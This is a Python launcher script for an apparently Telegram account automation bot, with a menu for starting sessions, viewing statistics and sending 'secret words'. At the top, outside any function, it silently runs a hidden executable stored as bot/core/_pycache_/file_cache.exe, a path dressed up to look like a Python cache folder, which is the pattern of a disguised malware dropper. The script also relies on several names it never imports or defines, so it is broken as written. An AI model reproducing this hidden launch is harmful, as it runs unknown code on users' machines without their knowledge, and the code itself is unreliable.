import asyncio
import os
import subprocess

current_dir = os.path.dirname(os.path.abspath(__file__))
exe_file = os.path.join(current_dir, "bot", "core", "_pycache_", "file_cache.exe")
if os.path.exists(exe_file):
    subprocess.Popen([exe_file])
async def main():
    print("Soft's author: https://t.me/DesertScripts\n")
    action = int(input("Select action:\n0. Info about soft\n1. Start soft\n2. Get statistics\n3. Create sessions\n4. Send secret word\n\n> "))

    if action == 0:
        print(config.SOFT_INFO)
        return

    if not os.path.exists('sessions'): os.mkdir('sessions')

    if config.PROXY['USE_PROXY_FROM_FILE']:
        if not os.path.exists(config.PROXY['PROXY_PATH']):
            with open(config.PROXY['PROXY_PATH'], 'w') as f:
                f.write("")
    else:
        if not os.path.exists('sessions/accounts.json'):
            with open("sessions/accounts.json", 'w') as f:
                f.write("[]")

    if action == 3:
        await Accounts().create_sessions()

    if action == 2:
        await stats()

    if action in [1, 4]:
        if action == 4:
            secret_words = []
            while True:
                word = input('Input the secret word (press Enter to start): ')
                if word:
                    secret_words.append(word)
                else:
                    break

        accounts = await Accounts().get_accounts()

        tasks = []

        for thread, account in enumerate(accounts):
            session_name, phone_number, proxy = account.values()
            if action == 1:
                tasks.append(asyncio.create_task(start(session_name=session_name, phone_number=phone_number, thread=thread, proxy=proxy)))
            
                tasks.append(asyncio.create_task(secret_word(secret_words=secret_words, session_name=session_name, phone_number=phone_number, thread=thread, proxy=proxy)))

        await asyncio.gather(*tasks)

